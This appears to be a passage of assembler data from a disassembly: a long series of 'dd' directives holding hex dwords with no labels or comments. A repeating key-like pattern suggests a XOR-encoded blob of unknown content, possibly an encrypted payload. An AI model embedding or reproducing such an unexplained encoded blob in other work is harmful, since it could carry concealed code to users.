		dd 4F64AC79h, 21465348h, 0C1960709h, 0E170302Dh, 7961B4D0h
		dd 484F64ACh, 9214653h
		dd 2DC19607h, 0D0E17030h, 0AC7961B4h, 53484F64h, 7092146h
		dd 302DC196h, 0B4D0E170h, 64AC7961h, 4653484Fh,	96070921h
		dd 70302DC1h, 61B4D0E1h, 4F64AC79h, 23465348h, 6136A70Bh
		dd 41D0908Dh, 0D9C11470h, 4A4DC40Ch, 92BADDCBh,	0B65A0D9Ch
		dd 4B7AEBABh, 37D9FA2Fh, 0F210D4D9h, 0A6A880E7h, 0AE8C6037h
		dd 28707A1Ah, 19F4E2DCh, 0F1E2FF32h, 97A7490h, 0EC90B199h
		dd 15EC4B25h, 654D83CEh, 9132E441h, 5D369C51h, 4028AB90h
		dd 6171F6D9h, 0FFFE6DBBh, 9581DD3Dh, 94990DBEh,	0C0A36039h
		dd 10CE68BDh, 0CFE8D33Ch, 20CBACBh, 7735F18Eh, 0CCD5F132h
		dd 0F80CE564h, 0DDC8D337h, 0B72623BAh, 0E8B20CE3h, 0FDB64879h
		dd 2902CA1Eh, 20433A2Eh, 5993260Ch, 7D72322Fh, 2139ECD5h
		dd 0D0D461F4h, 91B967CBh, 2FC3B705h, 0D5E475ACh, 0AE7BFAB1h
		dd 514F6E66h, 50B0067h,	0ACB15D94h, 0B6D2E3ECh,	47AF5863h
		dd 44516976h, 94050B23h, 72322FC3h, 4095E7E3h, 4D66AE4Eh
		dd 2344514Ah, 0C394050Bh, 0D651072Fh, 7B63B6D2h, 4A4D66AEh
		dd 0B234451h, 2FE0A105h, 10E37232h, 2CDB00B5h, 534A4D64h
		dd 7849546h, 30784896h,	0B41A5E70h, 64B53B61h, 46E62A4Fh
		dd 96050B21h, 704485C0h, 6178BDE6h, 0CEC1647Ch,	0E2556281h
		dd 3E9706C8h, 1E7290EEh, 8607EF17h, 18290363h, 21214230h
		dd 1DC19607h, 0B0E17030h, 0AD7961B4h, 53486F64h, 7092146h
		dd 302DC196h, 0B4D0E170h, 64AC7961h, 4653484Fh,	96070921h
		dd 70302DC1h, 61B4D0E1h, 4F64AC79h, 21465348h, 0C19E0709h
		dd 0E16D302Dh, 7945B4D0h, 485264ACh, 9324653h, 2DCB9607h
		dd 0D0E27030h, 0AC7861B4h, 53494F64h, 7092146h,	302DC196h
		dd 0B4D0E170h, 64AC7961h, 4653484Fh, 96070921h,	70302DC1h
		dd 61B4D0E1h, 4F64AC79h, 21465348h, 0C1960709h,	0E170302Dh
		dd 7961B4D0h, 484F64ACh, 9214653h, 2DC19607h, 0D0E17030h
		dd 0AC7961B4h, 53484F64h, 7092146h, 302DC196h, 0B4D0E170h
		dd 64AC7961h, 4653484Fh, 96070921h, 70302DC1h, 61B4D0E1h
		dd 4F64AC79h, 21465348h, 0C1960709h, 0E170302Dh, 7961B4D0h
		dd 484F64ACh, 9214653h,	2DC19607h, 0D0E17030h, 0AC7961B4h
		dd 53484F64h, 7082146h,	301C47F2h, 0B49FE170h, 64D07961h
		dd 4620484Fh, 965D0921h, 70732DC1h, 619AD0E1h, 4F7BAC79h
		dd 21505348h, 0C19B0709h, 0E175302Dh, 7960B4D0h, 484E64ACh
		dd 9214653h, 2DC19607h,	0D0E17030h, 0AC7961B4h,	53484F64h
		dd 7092146h, 302DC196h,	0B4D0E170h, 64AC7961h, 4653484Fh
		dd 96070921h, 70302DC1h, 61B4D0E1h, 4F64AC79h, 21465348h
		dd 0C1960709h, 0E170302Dh, 7961B4D0h, 484F64ACh, 9214653h
		dd 2DC19607h, 0D0E17030h, 0AC7961B4h, 53484F64h, 7092146h
		dd 302DC196h, 0B4D0E170h, 64AC7961h, 4653484Fh,	96070921h
		dd 70302DC1h, 61B4D0E1h, 4F64AC79h, 21465348h, 0C1970709h
		dd 0E1E98EA2h, 79947345h, 48ACFADAh, 9F52A02h, 2D7FD333h
		dd 0D07E7030h, 0ACE861B4h, 53324F64h, 7682146h,	3067C196h
		dd 0B4E4E170h, 648F7961h, 464A484Fh, 96170921h,	70372DC1h
		dd 61B5D0E1h, 4F65AC79h, 21465348h, 0C1960709h,	0E170302Dh
		dd 7961B4D0h, 484F64ACh, 9214653h, 2DC19607h, 0D0E17030h
		dd 0AC7961B4h, 53484F64h, 7092146h, 302DC196h, 0B4D0E170h
		dd 64AC7961h, 4653484Fh, 96070921h, 70302DC1h, 61B4D0E1h
		dd 4F64AC79h, 21465348h, 0C1960709h, 0E170302Dh, 7961B4D0h
		dd 484F64ACh, 9214653h,	2DC19607h, 0D0E17030h, 0AC7961B4h
		dd 53484F64h, 7092146h,	302CC196h, 0A45C5BFCh, 0FB53B6FEh
		dd 7CACA496h, 9BF8D692h, 70CFFF61h, 614B1C78h, 4F8A0802h
		dd 219C2B12h, 0C1535437h, 0E1D82323h, 79F4B4D0h, 48CF64ACh
		dd 9464653h, 2D909607h,	0D0D87030h, 0AC5E61B4h,	53544F64h
		dd 71A2146h, 3024C196h,	0B4D2E170h, 64AD7961h, 4652484Fh
		dd 96070921h, 70302DC1h, 61B4D0E1h, 4F64AC79h, 21465348h
		dd 0C1960709h, 0E170302Dh, 7961B4D0h, 484F64ACh, 9214653h
		dd 2DC19607h, 0D0E17030h, 0AC7961B4h, 53484F64h, 7092146h
		dd 302DC196h, 0B4D0E170h, 64AC7961h, 4653484Fh,	96070921h
		dd 70302DC1h, 61B4D0E1h, 4F64AC79h, 21465348h, 0C1960709h
		dd 0E171302Dh, 79FD0F5Ch, 87B0A835h, 0A5DEB3BFh, 413E69E1h
		dd 0B51E8FE2h, 0E7869D7Bh, 63B7A0A5h, 13F6C3F4h, 30D21732h
		dd 0B42F2DE9h, 645FD7E3h, 468CCB2Dh, 96CB6969h,	709F0BDDh
		dd 612DD0E1h, 4FE3AC79h, 21355348h, 0C1CF0709h,	0E14F302Dh
		dd 794AB4D0h, 485064ACh, 9344653h, 2DCA9607h, 0D0E27030h
		dd 0AC7861B4h, 53494F64h, 7092146h, 302DC196h, 0B4D0E170h
		dd 64AC7961h, 4653484Fh, 96070921h, 70302DC1h, 61B4D0E1h
		dd 4F64AC79h, 21465348h, 0C1960709h, 0E170302Dh, 7961B4D0h
		dd 484F64ACh, 9214653h,	2DC19607h, 0D0E17030h, 0AC7961B4h
		dd 53484F64h, 7092146h,	302DC196h, 0B4D1E170h, 6A6BBDF2h
		dd 0C6AC9AEFh, 72F8EFEDh, 1FCFD236h, 0E4B2F34h,	209B53ACh
		dd 4EB9AC9Dh, 0AE69F8DCh, 8E8FCFF8h, 2D9E4B05h,	70B0966Bh
		dd 15DEA0EBh, 2A3E4FAFh, 0D01EBFADh, 0AC8ED93Eh, 53A1D517h
		dd 7DA4D17h, 3095F7BEh,	0B44CE170h, 64227961h, 462A484Fh
		dd 96670921h, 70752DC1h, 619AD0E1h, 4F46AC79h, 215E5348h
		dd 0C19B0709h, 0E175302Dh, 7960B4D0h, 484E64ACh, 9214653h
		dd 2DC19607h, 0D0E17030h, 0AC7961B4h, 53484F64h, 7092146h
		dd 302DC196h, 0B4D0E170h, 64AC7961h, 4653484Fh,	96070921h
		dd 70302DC1h, 61B4D0E1h, 4F64AC79h, 21465348h, 0C1960709h
		dd 0E170302Dh, 7960B4D0h, 7B88A03Fh, 39DEA4E1h,	0D23E40ABh
		dd 541E8FCFh, 0DF869E6Ah, 20B7B0BDh, 74F6DE9Fh,	43D23E4Fh
		dd 0C72F1EA9h, 175386B8h, 35ACB796h, 0E5F8F6F8h, 3CFD218h
		dd 3F4B2F38h, 0E9B59B7h, 5B9BAF6h, 0CE69DBA4h, 0E18FE28Ch
		dd 799A7642h, 48A1C0D7h, 9FB3E09h, 2D7ED234h, 0D0417030h
		dd 0ACEA61B4h, 53374F64h, 76F2146h, 3061C196h, 0B4E4E170h
		dd 64897961h, 4649484Fh, 96170921h, 70382DC1h, 61B6D0E1h
		dd 4F64AC79h, 21465348h, 0C1960709h, 0E170302Dh, 7961B4D0h
		dd 484F64ACh, 9214653h,	2DC19607h, 0D0E17030h, 0AC7961B4h
		dd 53484F64h, 7092146h,	302DC196h, 0B4D0E170h, 64AD7961h
		dd 2C948CDCh, 9EF8F0EAh, 0AFCFE25Ch, 0D34B2913h, 399B5392h
		dd 57B9AC94h, 0B769F8D5h, 978FCFF1h, 0F9E4B0Ch,	3EB09B70h
		dd 7FDEB98Fh, 5B3E69DBh, 0A61E8FECh, 0DA869E68h, 25B7B0B8h
		dd 71F6DE9Ah, 46D23E4Ah, 0DC2F1EACh, 2E5380B5h,	72ACA48Bh
		dd 80F8EB96h, 70CFFB67h, 614B1C78h, 4F9702FBh, 2199D02Ah
		dd 0C1505537h, 0E1D82323h, 79F6B4D0h, 48CA64ACh, 94C4653h
		dd 2D929607h, 0D0DB7030h, 0AC6561B4h, 534E4F64h, 7092146h
		dd 302DC196h, 0B4D0E170h, 64AC7961h, 4653484Fh,	96070921h
		dd 70302DC1h, 61B4D0E1h, 4F64AC79h, 21465348h, 0C1960709h
		dd 0E170302Dh, 7961B4D0h, 484E64ACh, 77E884C2h,	0F3E69D3h
		dd 5F1EAA99h, 79868866h, 2AB7B091h, 7EF6DE99h, 49D23E49h
		dd 0CD2F1EAFh, 1D5386BEh, 3FACB790h, 0EFF8F6FEh, 9CFD21Eh
		dd 184B2F3Eh, 369B53A6h, 58B9AC97h, 0B869F8D6h,	988FCFF2h
		dd 9E4B0Fh, 31B09B73h
		dd 70DEB98Ch, 543E69D8h, 0A21E8FEFh, 0F8869D6Fh, 6EB7A0AEh
		dd 18F6C7FBh, 30D2183Dh, 0B42F2DE9h, 645BC1EBh,	46B7C624h
		dd 96CA5666h, 70861BE9h, 6127D0E1h, 4F3AAC79h, 215F5348h
		dd 0C1970709h, 0E170302Dh, 7961B4D0h, 484F64ACh, 9214653h
		dd 2DC19607h, 0D0E17030h, 0AC7961B4h, 53484F64h, 7092146h
		dd 302DC196h, 0B4D0E170h, 64AC7961h, 4652484Fh,	15F5C3B6h
		dd 41CFD217h, 514B3151h, 0B09B7AD5h, 0A4B9ACB7h, 0BC69F8ECh
		dd 9C8FCFCEh, 49E4B33h,	35B09B4Fh, 74DEB9B0h, 503E69E4h
		dd 0AD1E8FD3h, 0D1869E57h, 2EB7B087h, 7AF6DEA5h, 4DD23E75h
		dd 0C92F1E93h, 19538682h, 3BACB7ACh, 0EBF8F6C2h, 0DCFD222h
		dd 1C4B2F02h, 329B539Ah, 5CB9ACABh, 0BC69F8EAh,	9C8FCFCEh
		dd 269E4B33h, 0FB0967Dh, 2EDEAF90h, 253E4AB7h, 0D01EBFAEh
		dd 0AC9CEFDEh, 53C64F64h, 73D2146h, 302AC196h, 0B4D0E170h
		dd 64AC7961h, 4653484Fh, 96070921h, 70302DC1h, 61B4D0E1h
		dd 4F64AC79h, 21465348h, 0C1960709h, 0E170302Dh, 7961B4D0h
		dd 484F64ACh, 9204653h,	0AA3E5A9Eh, 931E8FE7h, 0AC86880Dh
		dd 0BCB783FDh, 0B7F6DDBFh, 0B0D23E79h, 342F1E96h, 0E4538687h
		dd 0C6ACB7A9h, 16F8F6C7h, 0F0CFD227h, 0E14B2F07h, 0CF9B539Fh
		dd 0A1B9ACAEh, 4169F8EFh, 618FCFCBh, 0F99E4B36h, 0C8B09B4Ah
		dd 89DEB9B5h, 0AD3E69E1h, 501E8FD6h, 2C869E52h,	0D3B7B082h
		dd 87F6DEA0h, 0B0D23E70h, 342F1E96h, 0E4538687h, 0C6ACB7A9h
		dd 16F8F6C7h, 1ACFD227h, 614B2937h, 4F9F6EEBh, 21EB4046h
		dd 0C1C80709h, 0E165302Dh, 7960B4D0h, 484F64ACh, 9214653h
		dd 2DC19607h, 0D0E17030h, 0AC7961B4h, 53484F64h, 7092146h
		dd 302DC196h, 0B4D0E170h, 64AC7961h, 4653484Fh,	96060921h
		dd 0FCCFE158h, 2D4B2F38h, 5E9B41C4h, 0BEB987E9h, 1969EBD0h
		dd 658FCFD5h, 0FD9E4B3Ah, 0CCB09B46h, 8DDEB9B9h, 0A93E69EDh
		dd 541E8FDAh, 28869E5Eh, 0D7B7B08Eh, 83F6DEACh,	0B4D23E7Ch
		dd 302F1E9Ah, 0E053868Bh, 0C2ACB7A5h, 12F8F6CBh, 0F4CFD22Bh
		dd 0E54B2F0Bh, 0CB9B5393h, 0A5B9ACA2h, 4569F8E3h, 658FCFC7h
		dd 0FD9E4B3Ah, 0CCB09B46h, 8DDEB9B9h, 0A93E69EDh, 0B61E8FDAh
		dd 9C869E78h, 53B793DDh, 7D2561Fh, 30A8C196h, 0B4FBE170h
		dd 64A87961h, 4653484Fh, 96070921h, 70302DC1h, 61B4D0E1h
		dd 4F64AC79h, 21465348h, 0C1960709h, 0E170302Dh, 7961B4D0h
		dd 484F64ACh, 9214653h,	9C29607h, 411EA999h, 0EB869E6Eh
		dd 71B7A2DFh, 57F6FCECh, 0C7D21D2Fh, 332F1E8Eh,	0E353868Ch
		dd 0C1ACB7A2h, 11F8F6CCh, 0F7CFD22Ch, 0E64B2F0Ch, 0C89B5394h
		dd 0A6B9ACA5h, 4169F8E4h, 958FCFCBh, 159E4B0Ah,	2EB09B7Eh
		dd 6FDEB99Fh, 4B3E69CBh, 0B61E8FFCh, 0C4869E78h, 23B7B0AAh
		dd 7DF6DE90h, 0B4D23E76h, 332F1E9Ah, 0E353868Ch, 0C1ACB7A2h
		dd 11F8F6CCh, 0F7CFD22Ch, 74B2F0Ch, 389B53B5h, 21B9A1AEh
		dd 0C161BF83h, 0E1D3302Dh, 7933B4D0h, 485E64ACh, 9214653h
		dd 2DC19607h, 0D0E17030h, 0AC7961B4h, 53484F64h, 7092146h
		dd 302DC196h, 0B4D0E170h, 64AC7961h, 4653484Fh,	96070921h
		dd 56392DC1h, 0F74B094Bh, 0D9B53A5h, 1BB9BEF2h,	0C169EEBFh
		dd 0E8FFCB4h, 0D79E4829h, 0C2B09B58h, 83DEB9A3h, 0A73E69F7h
		dd 5A1E8FC0h, 26869E44h, 0D4B7B094h, 74F6DEABh,	5AD23E4Fh
		dd 0DE2F1EA0h, 0EB5386B1h, 0F3ACA288h, 51F8DD9Dh, 0AACFEA74h
		dd 0A64B6A4Fh, 0FA9B68CBh, 0AEB99CFFh, 0AB69E0CAh, 8D8FCFFDh
		dd 69E4B02h, 0C2B09B49h, 83DEB9A3h, 0A73E69F7h,	5A1E8FC0h
		dd 0CA869E44h, 0F5B7B0A8h, 18F6DEB9h, 30D2173Ah, 0B401BF36h
		dd 64D17961h, 4676484Fh, 96040921h, 70302DC1h, 61B4D0E1h
		dd 4F64AC79h, 21465348h, 0C1960709h, 0E170302Dh, 7961B4D0h
		dd 484F64ACh, 9214653h,	2DC19607h, 0F7A9C6B8h, 3786B81Eh
		dd 1BB7B0BAh, 4FF6D1FBh, 3ED2312Bh, 1B2F32D0h, 0B05396BEh
		dd 0CBACB7B5h, 1BF8F6D2h, 0FDCFD232h, 0EC4B2F12h, 0C89B538Ah
		dd 51B9ACA5h, 0AF69F8DFh, 568FCFF9h, 8F9E6C13h,	0B7B0D01Eh
		dd 0F6DEF0E5h, 0D23E53C2h, 2F1EBCFCh, 5386B461h, 0ACB781AAh
		dd 0F8F6E483h, 0C6D26D3Ah, 32F43EFh, 0A53B5D6h,	3FACB79Bh
		dd 1BF8F6FEh, 0FDCFD232h, 0EC4B2F12h, 299B538Ah, 8DB9AC84h
		dd 0AD69F8F6h, 0E18FDCF4h, 79921A52h, 48D264ACh, 9664653h
		dd 2DCC9607h, 0D0E17030h, 0AC7961B4h, 53484F64h, 7092146h
		dd 302DC196h, 0B4D0E170h, 64AC7961h, 4653484Fh,	96070921h
		dd 70302DC1h, 49FC6669h, 0D09B75D2h, 6FB9AC97h,	8F69F4C9h
		dd 0CD8FC3EDh, 199E567Fh, 0B0B0BB13h, 98DEB9ADh, 0BC3E69F0h
		dd 411E8FC7h, 23869E43h, 27B7B091h, 7CF6DE9Ch, 0D5D23A40h
		dd 4B2F25CDh, 9B53C7DFh, 0B9AC9D9Ah, 69F8D2FAh,	8FCFF61Ah
		dd 9E4B0C3Dh, 0B09B73A6h, 0DEB9B3A8h, 3E69E3EDh, 1E8FDAC7h
		dd 869E5632h, 0ADB0D21Ah, 72DEEAF6h, 0AC3E6FD3h, 411E8FD7h
		dd 3D869E43h, 35B7B093h, 0B5F6DE8Ah, 82D23E69h,	0A22F1E8Fh
		dd 6453ABC7h, 46970A7Dh, 96750921h, 702F2DC1h, 61B5D0E1h
		dd 4F64AC79h, 21465348h, 0C1960709h, 0E170302Dh, 7961B4D0h
		dd 484F64ACh, 9214653h,	2DC19607h, 0D0E17030h, 9F30D232h
		dd 0CCB793D4h, 53F6DF99h, 64D23755h, 0FE2F17B3h, 745388DFh
		dd 0B9AC87D0h, 3EF8F6DEh, 0E4CFD23Ah, 0F54B2F1Bh, 0CE9B5383h
		dd 5EB9ACAFh, 2F69FCD3h, 158FF492h, 929E7E1Ch, 0AEB0B074h
		dd 0EFDE928Bh, 0CB3E42DFh, 391EA4E8h, 4386B56Ch, 0AAB79AB3h
		dd 0F8F6F99Fh, 0CFD21F48h, 4B2F0091h, 9B539088h, 0B9ACA5A2h
		dd 73F8DBF3h, 0FCF8167h, 0F14B2939h, 0DB9B538Fh, 47B9ACB2h
		dd 7869F8C5h, 588FCFD2h, 249E4B2Fh, 48B08260h, 9CBDF20h
		dd 2D579607h, 0D0DC7030h, 0AC7061B4h, 53484F64h, 7092146h
		dd 302DC196h, 0B4D0E170h, 64AC7961h, 4653484Fh,	96070921h
		dd 70302DC1h, 61B4D0E1h, 1A2F02FAh, 0B7B9B5F6h,	9D69F9D2h
		dd 0BD8FCAEAh, 259E4E17h, 44B09E6Bh, 0A6DE94CCh, 0FF3E79D8h
		dd 481E8FCEh, 34869E4Ah, 2FB7B09Ah, 0D2F6DEA4h,	0C3D2155Ch
		dd 532F28BBh, 8C53AFB8h, 0AFAC9094h, 7FF8D0FDh,	99CFF71Ch
		dd 894B0A3Ch, 0A89B75A5h, 0C7B98492h, 3069D3D1h, 1C8FE5FAh
		dd 869E680Ch, 0B7B0854Dh, 0F6DEAFBAh, 0D23E7BEAh, 51EB8F8h
		dd 2786D81Bh, 0CBB7B095h, 61F6DEB8h, 8FD23E5Ah,	0B2F1E8Fh
		dd 0D753869Eh, 4AACB4B6h, 96F8C6BEh, 708709DAh,	61DDD0E1h
		dd 4F7EAC79h, 21475348h, 0C1960709h, 0E170302Dh, 7961B4D0h
		dd 484F64ACh, 9214653h,	2DC19607h, 0D0E17030h, 0AC7861B4h
		dd 415E0E7h, 9CF6C7F9h,	52D23F4Bh, 0D62F1CBAh, 65384ABh
		dd 6DACB585h, 0F6F8E88Fh, 82CFF27Eh, 0F84B2F1Eh, 0D69B5386h
		dd 0B7B9ACB7h, 3D69F3D7h, 98FF6EBh, 909E6C0Bh, 0A3B0BE71h
		dd 0E5DE9BB3h, 0C13E49E6h, 3C1EAFD2h, 4786BE56h, 0B9B79284h
		dd 0EEF6FA98h, 0D7D21B4Bh, 5F2F37A9h, 9953ADB9h, 0B9AC9493h
		dd 69F8E8C0h, 8FCFC72Bh, 9E4B2011h, 0ED9B0BDEh,	0B8B9BFAAh
		dd 0A769F8F6h, 278FCFE1h, 0BF9E4B2Fh, 8EB09B53h, 43DEB9ACh
		dd 2D3E49B8h, 0D004FE5Ah, 0ACF761B4h, 537C4F64h, 70E2146h
		dd 302DC196h, 0B4D0E170h, 64AC7961h, 4653484Fh,	96070921h
		dd 70302DC1h, 61B4D0E1h, 4F65AC79h, 78CCEDC6h, 5E69E1B6h
		dd 878FCFF2h, 1F9E4B1Ch
		dd 2EB09B60h, 5ADEB99Fh, 0D3E63C5h, 2F1EA296h, 6A869E4Bh
		dd 0F0B7B09Bh, 0C7F6DEB9h, 0C5D22241h, 5E2F2EA0h, 8953A5BEh
		dd 0A8ACA9ACh, 66F8EBC4h, 80CFC926h, 914B3509h,	0A09B4991h
		dd 0CCB9B0AEh, 2A69E6EAh, 88FEDF2h, 9E9E6E0Dh, 0B9B0B275h
		dd 0F6DE9384h, 0D23E48D9h, 2F1E94D4h, 53868D58h, 82B78CA7h
		dd 0A4F6EF88h, 56D23E69h, 782F1EBCh, 0A853869Eh, 8AACB7B0h
		dd 25F8F6DEh, 70CFD433h, 614F1273h, 4FC9BF77h, 21185348h
		dd 0C1830709h, 0E171302Dh, 7961B4D0h, 484F64ACh, 9214653h
		dd 2DC19607h, 0D0E17030h, 0AC7961B4h, 53494F64h, 5B839FC8h
		dd 94D22756h, 0DF2F1E91h, 0F5386B0h, 2DACB79Eh,	0FDF8F6F0h
		dd 7ECFD210h, 0EE4B0241h, 0B09B45ABh, 0CAB9ACB7h, 2069F8F6h
		dd 168FC1C1h, 899E5431h, 0B8B08344h, 0F8DEA2B4h, 0DF3E70EEh
		dd 231E99DBh, 5F868858h, 0A2B7A688h, 0F6F6C6ACh, 0DED2277Fh
		dd 5F2F0394h, 8D53A4BEh, 0A0AC9292h, 6FF8DDF9h,	8FCFF518h
		dd 9E4B3001h, 0B09B4693h, 0C1B99883h, 6C69C7C9h, 878FCFD2h
		dd 0AB9E4B1Ch, 9AB09B53h, 0DBDEB9ACh, 0FF3E69F8h, 921E8FCFh
		dd 0AC86BD0Dh, 5393383Dh, 78C2146h, 3006C196h, 0B4D4E170h
		dd 64AC7961h, 4653484Fh, 96070921h, 70302DC1h, 61B4D0E1h
		dd 4F64AC79h, 21475348h, 401DBB84h, 7A8FDFFDh, 99E4B31h
		dd 38B09B7Ah, 79DEB985h, 5D3E69D1h, 9D1E8FE6h, 0AB868E77h
		dd 33B780F9h, 88F6FEF9h, 8FD22844h, 5B2F1396h, 9B538598h
		dd 0B9ACB7B0h, 6BF8F6DEh, 8CCFD63Dh, 9B4B291Bh,	0B79B5A8Eh
		dd 0D7B9A0BCh, 3369F7F8h, 108FD8C6h, 949E5239h,	0A2B0854Fh
		dd 0EEDE9D8Dh, 0C23E41DDh, 2F1EA5E7h, 5386BE6Bh, 0ACB7A982h
		dd 0EAF6E582h, 88D27720h, 0D22F1E8Fh, 0BD5386ADh, 9FACB7B0h
		dd 4FF8F6DEh, 0A9CFD23Eh, 0C24B2F1Eh, 4F9B5E9Fh, 21B1EBC2h
		dd 0C1350709h, 0E122302Dh, 7970B4D0h, 484F64ACh, 9214653h
		dd 2DC19607h, 0D0E17030h, 0AC7961B4h, 53484F64h, 7082146h
		dd 0A1A3791Ch, 2F2F13A6h, 12538682h, 30ACB793h,	0E0F8F6FDh
		dd 6CFD21Dh, 174B2F3Dh,	289B53A5h, 62B9AA9Ch, 0EC69EEB6h
		dd 0C98FEF9Eh, 799E724Bh, 58B0A835h, 49DE89CCh,	0AD3E4FB4h
		dd 4F1E96FCh, 13868D6Dh, 0ACB7BD82h, 0F8F6DEB9h, 0C8D23E69h
		dd 452F1284h, 8B539E8Bh, 0ADACABA9h, 7EF8D4C1h,	98CFF41Dh
		dd 9E4B0439h, 0B09B70A5h, 0DEB9B0ABh, 3169C0CEh, 238F8C91h
		dd 1F9E4B2Fh, 97B09B60h, 0D6DEB9ACh, 0F23E69F8h, 0F1E8FCFh
		dd 73869E4Bh, 79B7B09Bh, 7F6F7EAh, 30FC9FD0h, 0B4ADE170h
		dd 64897961h, 4650484Fh, 96070921h, 70302DC1h, 61B4D0E1h
		dd 4F64AC79h, 21465348h, 0C1970709h, 74C9F1BCh,	0D89E4607h
		dd 34B09B4Bh, 75DEB9B1h, 513E69E5h, 0AC1E8FD2h,	0D0869E56h
		dd 2FB7B086h, 7BF6DEA4h, 4CD23E74h, 322F1E92h, 0A95395B3h
		dd 97AC2126h, 39F89FB1h, 0F0CF825Eh, 314B0056h,	7F9B7FC9h
		dd 21B99CEEh, 0B169CB90h, 1E8FD2EBh, 8E9E4B2Fh,	0B8B0955Eh
		dd 0E5DEA3BBh, 0C43E49E5h, 361EAAEDh, 5386B56Ch, 0ACB794BFh
		dd 0F8F6C3A4h, 0C2D2085Fh, 782F23B2h, 253869Eh,	0A3ACB783h
		dd 73F8F6DEh, 95CFD23Eh, 844B2F1Eh, 0AA9B5386h,	0AEB9ACB7h
		dd 0C169EBD0h, 0E1839EAFh, 79FCB4D0h, 480864ACh, 92C4653h
		dd 2DC19607h, 0D0E17030h, 0AC7961B4h, 53484F64h, 7092146h
		dd 302CC196h, 2C1725E3h, 0C1538BB9h, 0C7ACB7A5h, 17F8F6C6h
		dd 0F1CFD226h, 0E04B2F06h, 0CE9B539Eh, 0A0B9ACAFh, 4069F8EEh
		dd 608FCFCAh, 0F89E4B37h, 0F8B09B4Bh, 0EFDED9C5h, 0D23E1687h
		dd 2F1EDB9Bh, 53868752h, 0ACB7A388h, 0E8F6C4A3h, 0D21B41h
		dd 0C42F2FD4h, 9B539BA7h, 0B3ACB7B0h, 7AF8E7D1h, 99CFF223h
		dd 874B0A3Ch, 0B09B78A1h, 0DEB98893h, 3E69E6E8h, 148FE1FCh
		dd 0AF9E7D19h, 2EB09B53h, 0E5DEB99Fh, 0C13E69F8h, 3C1E8FCFh
		dd 40869E4Bh, 0BFB7B09Bh, 0EBF6DEB9h, 2ED23E69h, 0B42F33D6h
		dd 64683B53h, 4621484Fh, 96180921h, 70312DC1h, 61B4D0E1h
		dd 4F64AC79h, 21465348h, 0C1960709h, 0E171302Dh, 0D1A67043h
		dd 0EEB09173h, 8EDEB9BDh, 0AA3E69EAh, 571E8FDDh, 2B869E59h
		dd 0D4B7B089h, 80F6DEABh, 0B7D23E7Bh, 332F1E9Dh, 0E353868Ch
		dd 0CDACB7A2h, 29F8FCC5h, 99CFAE41h, 9E4B5968h,	0B09B4095h
		dd 0DEB9A9B2h, 3E69E9E7h, 2E8FEFF2h, 699E726Ch,	0D7B0AE36h
		dd 0F6DEAA8Ah, 0D23E69F8h, 2B1E8FCFh, 5586994Dh, 0ACB7BB91h
		dd 0F8F6CAADh, 0CFD22B7Ch, 432F0392h, 8453AEB6h, 20ACB7B0h
		dd 64F8F6EDh, 82CFD23Eh, 934B2F1Eh, 0BD9B5386h,	0D3B9ACB7h
		dd 3369F8F6h, 988FCFD2h, 799E521Ch, 48A5FDDFh, 9B74653h
		dd 2DFC9607h, 0D0E87030h, 0AC7961B4h, 53484F64h, 7092146h
		dd 302DC196h, 0B4D1E170h, 0B064BAF3h, 0D8ACB7BEh, 1BF8F6D3h
		dd 0FDCFD232h, 0EC4B2F12h, 0C29B538Ah, 0ACB9ACBBh, 4C69F8FAh
		dd 6C8FCFDEh, 0F49E4B23h, 0C5B09B5Fh, 84DEB9A0h, 0BC3E69F4h
		dd 101E85DAh, 7586E235h, 0A6B7CEE5h, 0F8F6E483h, 0CFD21146h
		dd 4B2F25B4h, 0AB53D4CCh, 66ACE3EEh, 96F8CFB8h,	30CFE158h
		dd 314B0952h, 0CF9B70C0h, 0BEB9B584h, 7E69EBD0h, 0E8FC2CBh
		dd 869E4829h, 0B7B09B53h, 0F5DEB9ACh, 0D03E69F8h, 2C1E8FCFh
		dd 57869E4Bh, 0A8B7B09Bh, 0FEF6DEB9h, 0C9D23E69h, 5D2F1E8Fh
		dd 74538598h, 46AC87D0h, 96B32D3Ah, 70512DC1h, 61A2D0E1h
		dd 4F65AC79h, 21465348h, 0C1960709h, 0E170302Dh, 7960B4D0h
		dd 9186A63Dh, 0ADDEB9A1h, 0BF3E69F1h, 421E8FC8h, 3E869E4Ch
		dd 0C1B7B09Ch, 95F6DEBEh, 0A2D23E6Eh, 262F1E88h, 0F6538699h
		dd 0D4ACB7B7h, 4F8F6D9h, 0E2CFD239h, 0F34B2F19h, 0E79B5381h
		dd 0E5B9958Ah, 10697E71h, 3F8F425Fh, 0A69E3652h, 94B0E72Fh
		dd 0C7DE3D28h, 873EE475h, 511E1854h, 0CA8612D3h, 19B7D9E6h
		dd 2DF6C78Fh, 1DD20209h, 0B42F55FEh, 6453B5F8h,	6AC84D6h
		dd 0C6F8D092h, 0F0CFF178h, 0CE4B362Dh, 0F09B43A6h, 0DEB9A1AEh
		dd 3E69F8F6h, 1E8FCFD2h, 869E4B2Fh, 28B09B53h, 9DE99ECh
		dd 2D180077h, 0D0BA7030h, 0AC6C61B4h, 53494F64h, 7092146h
		dd 302DC196h, 0B4D0E170h, 64AD7961h, 98AC84D6h,	3FF8F6D5h
		dd 0E8CFD23Ah, 0F94B2F1Fh, 0D79B5387h, 0B9B9ACB6h, 5969F8F7h
		dd 798FCFD3h, 0E19E4B2Eh, 0D0B09B52h, 91DEB9ADh, 0B53E69F9h
		dd 481E8FCEh, 34869E4Ah, 0CBB7B09Ah, 9FF6DEB8h,	91D23E68h
		dd 42F0392h, 0C853C8D0h, 0E9ACF8FFh, 3FF893BBh,	0D6CF806Ch
		dd 0FD4B7C4Dh, 0D79B73A6h, 0B9B9ACB6h, 4869F8F7h, 588FAEB0h
		dd 0CA9EC5A1h, 21B00AC2h, 7ADE2533h, 2D3E64E1h,	0D01EBCA9h
		dd 0ACB41EEBh, 5386F2EAh, 7DCE7D3h, 20D20D0Fh, 0F42F2EEFh
		dd 1453A0D2h, 76ACAA89h, 96F8DF8Dh, 708E8741h, 619CD0E1h
		dd 4F63AC79h, 21465348h, 0C1960709h, 0E170302Dh, 7961B4D0h
		dd 484E64ACh, 0EBDE8ACAh, 863E69F2h, 491E8FCDh,	35869E4Bh
		dd 0CAB7B09Bh, 9EF6DEB9h, 0A9D23E69h, 2D2F1E8Fh, 0FD53869Eh
		dd 0DFACB7B0h, 0FF8F6DEh, 0E9CFD23Eh, 0F84B2F1Eh, 0D69B5386h
		dd 0B8B9ACB7h, 5869F8F6h, 788FCFD2h, 0E09E4B2Fh, 0D1B09B53h
